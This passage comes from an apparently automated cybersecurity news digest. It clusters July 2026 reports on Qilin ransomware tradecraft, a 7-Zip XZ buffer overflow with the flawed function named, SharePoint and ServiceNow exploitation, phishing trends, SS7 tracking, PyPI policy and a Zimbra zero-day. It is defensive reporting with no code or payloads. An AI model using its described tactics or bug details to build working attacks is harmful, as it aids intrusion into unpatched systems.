VPN sessions, followed by escalating their attacks to facilitate credential harvesting and lateral movement through Windows administrative shares via compromised administrative accounts. The activity is also characterized by the attackers taking deliberate steps to clear event logs and disable Microsoft Defender Real-Time Protection prior to running the ransomware payload so as to minimize the likelihood of detection and avoid leaving forensic evidence. Despite similarities in ransomware staging paths, PsExec-based execution, and an unusual Windows Registry persistence pattern (i.e., an asterisk followed by six randomized lowercase alphabetic characters), follow-on attacks varied across victims. This ranged from enterprise-wide encryption with no data exfiltration and extensive reconnaissance via remote access tools like AnyDesk, Ngrok, or LogMeIn to large-scale credential theft and instances of data exfiltration to the MEGA cloud service before ransomware deployment using Rclone, Proton Drive, and FileZilla. "This variability is consistent with RaaS models, in which multiple affiliates may leverage shared initial access infrastructure and ransomware tooling while applying their own preferred post-exploitation methodologies," Arctic Wolf said. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Cybercrime , endpoint security , enterprise security , network security , ransomware , VPN Security , Vulnerability , Windows Security ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Through One Email Microsoft Maps Three Salesforce Attack Paths Tied to a Year of ShinyHunters Activity OAuth Client ID Spoofing Lets Attackers Validate Stolen Microsoft Entra Credentials 11 Old Microsoft-Signed Linux UEFI Shims Could Let Attackers Bypass Secure Boot Researchers Say Claude for Chrome Flaw Lets Rogue Extensions Trigger Gmail Reads Microsoft Patches Record 622 Flaws, Including Two Zero-Days Under Active Attack Cursor Flaw Lets Malicious Cloned Repositories Trigger Windows Code Execution Researcher Drops New Windows Zero-Day PoC Hours After Microsoft
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Qilin Ransomware Attackers Exploit PAN-OS Authentication Bypass for Initial Access
  - Published: 2026-07-21T14:04:57+00:00
  - Link: https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html
  - Summary: Threat actors have been observed exploiting a now-patched high-severity Palo Alto Networks PAN-OS vulnerability as an entry point to deploy Qilin (aka Agenda) ransomware on victim environments. Arctic Wolf Labs said it investigated multiple intrusions in June 2026 that began with the exploitation of CVE-2026-0257 (CVSS score: 7.8), an authentication bypass flaw affecting the portal and gateway

### Cluster 629e6024b5 — score 14

- Title: New 7-Zip Vulnerability Could Let Crafted XZ Archives Run Code During Extraction
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-20T09:10:56+00:00
- Link: https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-14266

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, zero_day
- actor_attribution: ShinyHunters
- affected_products: Microsoft 365, Microsoft Entra, Salesforce
- cve_ids: CVE-2026-14266, CVE-2026-48095
- urgency_signals: actively_exploited, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, active_exploitation
- actor_attribution: ShinyHunters
- affected_products: Salesforce, Microsoft Entra, Microsoft 365
- cve_ids: CVE-2026-14266, CVE-2026-48095
- urgency_signals: actively_exploited, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Opening a crafted XZ archive in 7-Zip could let an attacker run code on the machine. The flaw, CVE-2026-14266, is a heap-based buffer overflow in how the archiver processes XZ chunked data, and Trend Micro's Zero Day Initiative (ZDI) detailed it on July 15. A fix shipped on June 25 in 7-Zip 26.02. The overflow lets an attacker "execute code in the context of the current process," per the
```

#### Full body

```
New 7-Zip Vulnerability Could Let Crafted XZ Archives Run Code During Extraction  Swati Khandelwal  Jul 20, 2026 Vulnerability / Endpoint Security Opening a crafted XZ archive in 7-Zip could let an attacker run code on the machine. The flaw, CVE-2026-14266 , is a heap-based buffer overflow in how the archiver processes XZ chunked data, and Trend Micro's Zero Day Initiative (ZDI) detailed it on July 15. A fix shipped on June 25 in 7-Zip 26.02 . The overflow lets an attacker "execute code in the context of the current process," per the advisory. The code runs with the token 7-Zip itself holds and gains no privileges of its own. On Windows, a normally launched 7-Zip runs under a filtered standard-user token even on an administrator account, so the attacker inherits those limited rights unless the program was started elevated. The bug came in from Landon Peng of Lunbun LLC, who reported it to 7-Zip on June 5. ZDI rates the flaw 7.0, or High, not the Critical several write-ups reached for. The full CVSS 3.0 vector is AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H . The AV:L makes it a local attack vector, not a network-reachable or no-click one. ZDI's "remote code execution" describes a remote attacker delivering the file, which the victim still has to open, whether it arrives by email, a download, or a web page that hands it to 7-Zip. The high attack complexity makes reliable exploitation harder still. As of July 20, 2026, The Hacker News found no public proof-of-concept for the bug and no credible report of exploitation in the wild. The Hacker News compared the XZ decoder source across releases. The fix lands in one function, MixCoder_Code in C/XzDec.c . When an XZ stream runs its output through a filter, the decoder was handed the full output-buffer length on each pass instead of the space left after earlier writes. That gave it more room to work with than the buffer held, the out-of-bounds write condition ZDI describes. Version 26.02 subtracts the bytes already written and bails out if that running total ever exceeds the buffer. The same flawed length handling appears unchanged in 7-Zip source back to at least version 21.07 (2021), though neither ZDI nor 7-Zip has said which releases are actually exploitable. CVE-2026-14266 is the latest in a run of memory-safety bugs in 7-Zip's archive handlers. On April 27, version 26.01 fixed a batch of them , including the higher-scored CVE-2026-48095 , an NTFS-handler heap-write overflow that GitHub Security Lab detailed on May 22 with a working proof-of-concept. The XZ flaw is the quieter of the two so far, and 26.02 rolls up every one of these fixes, so one update covers them all. So update to 7-Zip 26.02 or later on every machine that opens archives from outside. Updating is a manual install from the official site, so set-and-forget machines will not pick it up on their own. Any product that ships a vulnerable copy of 7-Zip's XZ decoder needs its own vendor fix. The patch went out 20 days before the advisory, so anyone who updated in late June was covered before the details were public. For once, updating gets you ahead of the problem instead of chasing it. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Application Security , Code Execution , endpoint security , Patch Management , Software Security , Vulnerability , Windows ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Through One Email Microsoft Maps Three Salesforce Attack Paths Tied to a Year of ShinyHunters Activity OAuth Client ID Spoofing Lets Attackers Validate Stolen Microsoft Entra Credentials 11 Old Micr
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: New 7-Zip Vulnerability Could Let Crafted XZ Archives Run Code During Extraction
  - Published: 2026-07-20T09:10:56+00:00
  - Link: https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html
  - Summary: Opening a crafted XZ archive in 7-Zip could let an attacker run code on the machine. The flaw, CVE-2026-14266, is a heap-based buffer overflow in how the archiver processes XZ chunked data, and Trend Micro's Zero Day Initiative (ZDI) detailed it on July 15. A fix shipped on June 25 in 7-Zip 26.02. The overflow lets an attacker "execute code in the context of the current process," per the

### Cluster 7061b2c39d — score 13

- Title: Critical SharePoint RCE CVE-2026-50522 Under Active Exploitation After Public PoC
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-21T14:57:51+00:00
- Link: https://thehackernews.com/2026/07/critical-sharepoint-rce-cve-2026-50522.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-50522, Microsoft SharePoint

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, phishing_social_eng, vulnerability_disclosure
- actor_attribution: ShinyHunters
- affected_industries: government
- affected_products: Microsoft 365, Microsoft SharePoint, Salesforce
- cve_ids: CVE-2026-32201, CVE-2026-45659, CVE-2026-50522, CVE-2026-56164, CVE-2026-58644
- urgency_signals: poc_available, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, credential_theft, vulnerability_disclosure
- actor_attribution: ShinyHunters
- affected_industries: government
- affected_products: Salesforce, Microsoft SharePoint, Microsoft 365
- cve_ids: CVE-2026-50522, CVE-2026-56164, CVE-2026-58644, CVE-2026-32201, CVE-2026-45659
- urgency_signals: preauth_unauth, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
A third SharePoint Server flaw patched by Microsoft as part of its Patch Tuesday update for July 2026 has come under active exploitation, per watchTowr. The vulnerability in question is CVE-2026-50522 (CVSS score: 9.8), a critical deserialization of untrusted data in Microsoft Office SharePoint that could allow an unauthorized attacker to execute code over a network. Microsoft credited DEVCORE
```

#### Full body

```
Critical SharePoint RCE CVE-2026-50522 Under Active Exploitation After Public PoC  Ravie Lakshmanan  Jul 21, 2026 Vulnerability / Web Security A third SharePoint Server flaw patched by Microsoft as part of its Patch Tuesday update for July 2026 has come under active exploitation, per watchTowr . The vulnerability in question is CVE-2026-50522 (CVSS score: 9.8), a critical deserialization of untrusted data in Microsoft Office SharePoint that could allow an unauthorized attacker to execute code over a network. Microsoft credited DEVCORE researcher "splitline" with discovering and reporting the flaw. "In a network-based attack, an attacker authenticated as at least a Site Owner, could write arbitrary code to inject and execute code remotely on the SharePoint Server," Redmond said in an advisory released last week. "The attack vector is Network (AV:N) because this vulnerability is remotely exploitable and can be exploited from the internet. The attack complexity is Low (AC:L) because an attacker does not require significant prior knowledge of the system and can achieve repeatable success with the payload against the vulnerable component." The tech giant also tagged CVE-2026-50522 with an exploitability assessment of "Exploitation More Likely." In a post shared on LinkedIn, watchTowr said it has detected active exploitation of the shortcoming against on-premises Microsoft SharePoint deployments following the release of a public proof-of-concept (PoC) exploit, allowing attackers to steal machine keys to maintain persistent access. "Attackers are pulling SharePoint machine keys via a single request," the security vendor said. "Patching is not enough; defenders should rotate credentials on any assets that may have been exposed." Defused Cyber has also disclosed that threat actors are likely exploiting CVE-2026-50522 to deliver a .NET deserialization payload to a SharePoint sign-in endpoint. "The captured requests carry no authentication material, matching 50522's unauthenticated profile," it said. CVE-2026-50522 is the third vulnerability in SharePoint Server after CVE-2026-56164 (CVSS score: 5.3) and CVE-2026-58644 (CVSS score: 9.8) to witness active exploitation efforts, with the latter two weaponized as zero-days prior to them being fixed in July 2026. The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has since warned that threat actors are exploiting multiple SharePoint Server vulnerabilities, including CVE-2026-32201, CVE-2026-45659, CVE-2026-56164, and CVE-2026-58644, to gain unauthorized access to on-premises instances. "These vulnerabilities affect all supported on-premises SharePoint Server versions (Subscription Edition, 2019, and 2016) and involve establishing remote code execution (RCE) and post-exploitation activities, such as stealing Internet Information Services (IIS) machine keys and performing deserialization techniques, to gain persistence and deploy malware," the agency said. Update CISA, on July 22, 2026, added CVE-2026-50522 to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the fixes by July 25. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Credential Theft , Cyber Attack , enterprise security , exploit , Malware , Microsoft , remote code execution , server security , Vulnerability , Web Security ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Through One Email Microsoft Maps Three Salesforce Attack Paths Tied to a Year of ShinyHunters Activity OAuth Client ID Spoofing Lets Attackers Validate
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical SharePoint RCE CVE-2026-50522 Under Active Exploitation After Public PoC
  - Published: 2026-07-21T14:57:51+00:00
  - Link: https://thehackernews.com/2026/07/critical-sharepoint-rce-cve-2026-50522.html
  - Summary: A third SharePoint Server flaw patched by Microsoft as part of its Patch Tuesday update for July 2026 has come under active exploitation, per watchTowr. The vulnerability in question is CVE-2026-50522 (CVSS score: 9.8), a critical deserialization of untrusted data in Microsoft Office SharePoint that could allow an unauthorized attacker to execute code over a network. Microsoft credited DEVCORE

### Cluster b788e3a84d — score 12

- Title: Critical ServiceNow AI Platform Flaw Exploited for Unauthenticated Code Execution
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-21T06:29:26+00:00
- Link: https://thehackernews.com/2026/07/critical-servicenow-ai-platform-flaw.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-6875

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, zero_day
- actor_attribution: ShinyHunters
- affected_products: Microsoft 365, Microsoft Entra, Salesforce
- cve_ids: CVE-2026-6875
- urgency_signals: no_patch_yet, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, active_exploitation
- actor_attribution: ShinyHunters
- affected_products: Salesforce, Microsoft Entra, Microsoft 365
- cve_ids: CVE-2026-6875
- urgency_signals: zero_day, preauth_unauth, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Threat actors are now exploiting a recently disclosed critical security flaw impacting ServiceNow AI Platform, according to Defused Cyber. In a post shared on X, the threat intelligence firm said it's observing in-the-wild exploitation of CVE-2026-6875 (CVSS score: 9.5), a sandbox escape vulnerability that could allow an unauthenticated user to run arbitrary code. Patches for the flaw were
```

#### Full body

```
Critical ServiceNow AI Platform Flaw Exploited for Unauthenticated Code Execution  Ravie Lakshmanan  Jul 21, 2026 Vulnerability / Artificial Intelligence Threat actors are now exploiting a recently disclosed critical security flaw impacting ServiceNow AI Platform, according to Defused Cyber . In a post shared on X, the threat intelligence firm said it's observing in-the-wild exploitation of CVE-2026-6875 (CVSS score: 9.5), a sandbox escape vulnerability that could allow an unauthenticated user to run arbitrary code. Patches for the flaw were released by ServiceNow throughout June in the following versions - Brazil EA and Brazil GA Australia Patch 2 Zurich Patch 7b and Zurich Patch 9 Yokohama Patch 12 Hot Fix 1b and Yokohama Patch 13 Searchlight Cyber, which disclosed additional technical specifics, said it reported the issue on April 1, 2026, adding it allows a complete compromise of the ServiceNow instance as well as all connected proxy servers. Besides rolling out a fix, ServiceNow is "enhancing instance security by severely restricting the type of code that can run in sandbox contexts," security researcher Adam Kues noted . Defused initially noted that the exploitation efforts target the same pre-authentication endpoint ("/assessment_thanks.do") using HTTP POST requests, although the sandbox-escape gadget leads to the same code execution primitive by a different route documented in the proof-of-concept (PoC) exploit. However, in a subsequent post, Defused issued a correction, stating the captured payload in fact matches that of Searchlight Cyber's PoC. In light of active exploitation, customers of self-hosted versions are advised to apply the fixes, if not already, to counter the threat. Update Following the publication of the story, a ServiceNow spokesperson told The Hacker News that there has been no exploitation observed to date. "ServiceNow is aware of a cybersecurity company's recent publication regarding exploitation activity associated with a previously disclosed security vulnerability, identified as CVE-2026-6875," the spokesperson noted. "Based on our investigation to date, we have not observed evidence that this activity is related to instances that ServiceNow hosts." "We have provided updates and patches designed to address this issue, and we encourage our self-hosted and ServiceNow-hosted customers to apply the relevant patches if they have not already done so. In addition, we will continue to work directly with customers who need assistance in applying the patches." (The story was updated after publication to include a response from ServiceNow.) Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Application Security , artificial intelligence , Cloud security , enterprise security , Vulnerability ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Through One Email Microsoft Maps Three Salesforce Attack Paths Tied to a Year of ShinyHunters Activity OAuth Client ID Spoofing Lets Attackers Validate Stolen Microsoft Entra Credentials 11 Old Microsoft-Signed Linux UEFI Shims Could Let Attackers Bypass Secure Boot Researchers Say Claude for Chrome Flaw Lets Rogue Extensions Trigger Gmail Reads Microsoft Patches Record 622 Flaws, Including Two Zero-Days Under Active Attack Cursor Flaw Lets Malicious Cloned Repositories Trigger Windows Code Execution Researcher Drops New Windows Zero-Day PoC Hours After Microsoft Patch Tuesday TuxBot v3 Evolution Shows Signs of LLM-Assisted IoT Botnet Development Unpatched Shark Vacuum Flaw Could Let Attackers Control Other Vacuums Region-Wide New Agent Data Inj
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical ServiceNow AI Platform Flaw Exploited for Unauthenticated Code Execution
  - Published: 2026-07-21T06:29:26+00:00
  - Link: https://thehackernews.com/2026/07/critical-servicenow-ai-platform-flaw.html
  - Summary: Threat actors are now exploiting a recently disclosed critical security flaw impacting ServiceNow AI Platform, according to Defused Cyber. In a post shared on X, the threat intelligence firm said it's observing in-the-wild exploitation of CVE-2026-6875 (CVSS score: 9.5), a sandbox escape vulnerability that could allow an unauthenticated user to run arbitrary code. Patches for the flaw were

### Cluster afe64cb742 — score 11

- Title: Email threat landscape: Q2 2026 trends and insights
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-07-23T15:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, mfa_bypass, phishing_social_eng
- affected_products: Microsoft Defender
- content_type: intel_roundup
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, credential_theft, mfa_bypass
- affected_products: Microsoft Defender
- content_type: intel_roundup
- confidence_tier: tier_1_primary_research

#### Summary

```
In the second quarter of 2026, the continuing effects of Microsoft’s disruption of the Tycoon2FA phishing platform contributed to sustained declines in several major phishing techniques, while threat actors expanded into Teams-based social engineering and employed increasingly automated and multi-stage attack chains. The post Email threat landscape: Q2 2026 trends and insights appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Adversary-in-the-middle (AiTM) Credential theft Phishing Social engineering Threats intelligence Business email compromise Cybercrime Social engineering and phishing Content types Research Products and services Microsoft Defender Microsoft Defender for Endpoint Microsoft Defender for Office 365 Topics Actionable threat insights Threat intelligence The second quarter of 2026 (April–June) was largely defined by the continuing downstream effects following Microsoft’s Digital Crimes Unit-led disruption efforts against the Tycoon2FA phishing-as-a-service (PhaaS) platform in March. Phishing volume linked to the platform fell 92% from pre-disruption averages, including QR code phishing and CAPTCHA-gated phishing both declining from their March highs. Despite ongoing efforts to rebuild operations, Tycoon2FA did not recover its previous scale or influence during Q2, and no single service emerged to replace the platform at comparable scale. Inside tycoon2fa Infrastructure, tradecraft, and detections › These trends reflect both the measurable impact that disruption operations can have on phishing ecosystems and the adaptability of threat actors as they diversify delivery channels. At the same time, Microsoft Threat Intelligence observed continued growth in Teams-based social engineering, particularly voice phishing (vishing), with weekly malicious call attempts reaching nearly ten times the mid-2025 baseline by the end of the quarter. This activity illustrates how threat actors continue to expand beyond email into trusted workplace communication platforms where communications may appear more trustworthy to users. Microsoft detected approximately 7.6 billion email-based phishing threats throughout the quarter, with monthly volumes declining modestly from 2.7 billion in April to 2.4 billion in June. Credential phishing remained the dominant objective behind malicious payloads, while business email compromise (BEC) activity largely returned to historical norms after a brief, anomalous surge in April. Notable campaigns observed during the quarter also demonstrated how threat actors combine automation, trusted services, and multi-stage delivery chains to scale operations. These campaigns ranged from an automated BEC campaign that reached more than 67,000 users across 42,000 organizations in under three hours, to a multi-stage phishing campaign that used nested EML files, calendar invitations, and a Microsoft authentication redirect to deliver malware. Q2 AiTM token compromise April phishing campaign tactics, detections, and mitigations › This blog provides a view of email threat activity across the second quarter of 2026, highlighting key trends in phishing techniques, payload delivery, and threat actor behavior observed by Microsoft Threat Intelligence. We examine shifts in QR code and CAPTCHA-gated phishing activity, malicious payload trends, BEC activity, the growth of Teams-based threats, and notable campaigns observed during the quarter. We also provide recommendations and Microsoft Defender detections to help organizations identify and mitigate evolving threats while prioritizing defensive measures. Tycoon2FA Q2 disruption impact The disruption operation that Microsoft’s Digital Crimes Unit launched against Tycoon2FA infrastructure in early March continued to produce measurable results throughout Q2 2026. After falling 15% in March and another 22% in April, Tycoon2FA-linked phishing volume dropped 74% in May to just 1.5 million messages, then fell another 20% in June to 1.2 million, by far the lowest monthly volumes observed in at least a year. For reference, the average monthly volume of phishing messages linked to Tycoon2FA during the second half of 2025 was 15.1 million. By the end of Q2, volumes were running at roughly 8% of that baseline, representing a 92% total decline since the disruption operation began. email threat landscape Q1 trends that shaped Q2 activity › Figure 1. Tycoon2FA monthly m
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Email threat landscape: Q2 2026 trends and insights
  - Published: 2026-07-23T15:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/
  - Summary: In the second quarter of 2026, the continuing effects of Microsoft’s disruption of the Tycoon2FA phishing platform contributed to sustained declines in several major phishing techniques, while threat actors expanded into Teams-based social engineering and employed increasingly automated and multi-stage attack chains. The post Email threat landscape: Q2 2026 trends and insights appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Email threat landscape: Q2 2026 trends and insights
  - Published: 2026-07-23T15:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/
  - Summary: In the second quarter of 2026, the continuing effects of Microsoft’s disruption of the Tycoon2FA phishing platform contributed to sustained declines in several major phishing techniques, while threat actors expanded into Teams-based social engineering and employed increasingly automated and multi-stage attack chains. The post Email threat landscape: Q2 2026 trends and insights appeared first on Microsoft Security Blog .

### Cluster 542fdf33c7 — score 11

- Title: How Iran Uses Cellular Infrastructure to Target US Military Phones
- Source: Citizen Lab (threat_research_primary)
- Published: 2026-07-24T14:48:59+00:00
- Link: https://citizenlab.ca/how-iran-uses-cellular-infrastructure-to-target-us-military-phones/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: telecommunications
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: telecommunications
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Senior fellow Gary Miller spoke with Cape Cellular about the exploitation of mobile network vulnerabilities to track US personnel during the Iran war. The post How Iran Uses Cellular Infrastructure to Target US Military Phones appeared first on The Citizen Lab .
```

#### Full body

```
Date Published July 24, 2026 Topics Targeted Surveillance telecommunications Mentions Gary Miller Share Senior fellow Gary Miller spoke with Cape Cellular about the exploitation of mobile network vulnerabilities to track US personnel during the Iran war. He also discussed a recent Citizen Lab report about commercial surveillance vendors using the global telecom interconnect ecosystem to track targets. While SS7 attacks have been covered by the media for fifteen years, they are still taking place. “The fact it is still happening is telling…there’s a significant security problem within the mobile operator industry,” Miller says. Watch here More in: Targeted Surveillance LATEST We found that former Member of the European Parliament Stelios Kouloglou was hacked with Pegasus spyware while serving on the PEGA committee, which investigated Pegasus and other spyware abuses in Europe. Through forensic analysis of his device, we found that the attackers could have had access to confidential documents and committee deliberations. July 3, 2026 Targeted Surveillance News + Updates → In the Media US Military Smartphones Targeted Through Roaming and Ad Tech JULY 17, 2026 News + Updates → In the Media WhatsApp Accuses NSO of Fresh Pegasus Targeting JUNE 19, 2026 News + Updates → In the Media How Freedom Tech Is Pushing Back Against Digital Authoritarianism JUNE 17, 2026
```

#### Corroborating sources (1)

- **Citizen Lab** (threat_research_primary)
  - Title: How Iran Uses Cellular Infrastructure to Target US Military Phones
  - Published: 2026-07-24T14:48:59+00:00
  - Link: https://citizenlab.ca/how-iran-uses-cellular-infrastructure-to-target-us-military-phones/
  - Summary: Senior fellow Gary Miller spoke with Cape Cellular about the exploitation of mobile network vulnerabilities to track US personnel during the Iran war. The post How Iran Uses Cellular Infrastructure to Target US Military Phones appeared first on The Citizen Lab .

### Cluster d8d22ce90d — score 11

- Title: Quoting Seth Larson
- Source: Simon Willison (ai_security_agentic_risk)
- Published: 2026-07-23T04:50:36+00:00
- Link: https://simonwillison.net/2026/Jul/23/seth-larson/#atom-everything
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: PyPI

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_products: OpenAI/ChatGPT, PyPI
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_products: PyPI, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
The Python Package Index (PyPI) now rejects new files being uploaded to releases that are older than 14 days. This restriction was put in place to prevent old and long-stable releases from being poisoned in case publishing tokens or workflows of PyPI projects were compromised. As far as we are aware this has not yet been abused, but there is no technical reason beyond that attackers weren't aware it was possible. — Seth Larson , PyPI blog Tags: packaging , python , supply-chain , pypi , seth-michael-larson
```

#### Full body

```
Simon Willison’s Weblog Subscribe Sponsored by: Cursor — Delegate engineering tasks to Cursor Cloud Agents—even while your laptop is closed. Try Cursor & get 50% off your first month 23rd July 2026 The Python Package Index (PyPI) now rejects new files being uploaded to releases that are older than 14 days. This restriction was put in place to prevent old and long-stable releases from being poisoned in case publishing tokens or workflows of PyPI projects were compromised. As far as we are aware this has not yet been abused, but there is no technical reason beyond that attackers weren't aware it was possible. — Seth Larson , PyPI blog Posted 23rd July 2026 at 4:50 am Recent articles OpenAI’s accidental cyberattack against Hugging Face is science fiction that happened - 22nd July 2026 A Fireside Chat with Cat and Thariq from the Claude Code team - 21st July 2026 Kimi K3, and what we can still learn from the pelican benchmark - 16th July 2026 This is a quotation collected by Simon Willison, posted on 23rd July 2026 . packaging 51 pypi 49 python 1,267 supply-chain 20 seth-michael-larson 6 Disclosures Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026
```

#### Corroborating sources (1)

- **Simon Willison** (ai_security_agentic_risk)
  - Title: Quoting Seth Larson
  - Published: 2026-07-23T04:50:36+00:00
  - Link: https://simonwillison.net/2026/Jul/23/seth-larson/#atom-everything
  - Summary: The Python Package Index (PyPI) now rejects new files being uploaded to releases that are older than 14 days. This restriction was put in place to prevent old and long-stable releases from being poisoned in case publishing tokens or workflows of PyPI projects were compromised. As far as we are aware this has not yet been abused, but there is no technical reason beyond that attackers weren't aware it was possible. — Seth Larson , PyPI blog Tags: packaging , python , supply-chain , pypi , seth-michael-larson

### Cluster 332f35118d — score 11

- Title: Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-07-23T21:23:18+00:00
- Link: https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion, zero_day
- actor_attribution: APT28
- affected_industries: financial_services, government
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, apt_espionage
- actor_attribution: APT28
- affected_industries: financial_services, government
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A state-sponsored threat group, dubbed "Laundry Bear," sends "half-click" phishing emails that require a victim only to open or preview the message.
```

#### Full body

```
Cyberattacks & Data Breaches Cyber Risk Application Security Vulnerabilities & Threats News Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets A state-sponsored threat group, dubbed "Laundry Bear," sends "half-click" phishing emails that require a victim only to open or preview the message. Rob Wright , Senior News Director , Dark Reading July 23, 2026 4 Min Read Source: Anton Petrus via Getty Images Russian state-backed threat actors are compromising networks of Western governments and enterprises through the Zimbra Collaboration Suite (ZCS), according to intelligence and cybersecurity agencies in more than a dozen countries. In a joint advisory Thursday, the US government and several allied nations warned that an advanced persistent threat (APT) dubbed "Laundry Bear" has been targeting ZCS customers since July 2025. Laundry Bear actors used a zero-day vulnerability in ZCS , tracked as CVE-2025-66376, in a phishing campaign that featured what experts describe as a "half-click exploit" to breach Zimbra webmail servers. "Unlike traditional phishing campaigns that persuade a user into taking an action, such as clicking a link or opening a file, Laundry Bear’s latest campaign leverages a view-based exploit that only requires a user to view a malicious email within a vulnerable version of the webmail service," the agencies said in the advisory. Related: Brazilian Banking Trojan Actively Spreading in Portugal The campaign is designed "almost certainly to gather sensitive information for the Russian Federation," according the advisory. The Laundry Bear attacks mark yet another threat from Russian APTs against US organizations. Zimbra Zero-Day Activity Zimbra patched CVE-2025-66376 in November 2025 with the release of version 10.1.13, though the company did not disclose the flaw until weeks later. The initial release notes for v10.1.13 merely described the flaw as "a stored XSS vulnerability in the Classic UI where attackers could abuse CSS @import directives in email HTML," with no CVE at the time. The National Institute of Standards and Technology (NIST) and Mitre did not publish entries for the Zimbra flaw until early January. Dark Reading contacted Zimbra and parent company Synacor for comment on the apparent delayed disclosure for CVE-2025-66376, but neither company responded at press time. In a March 17 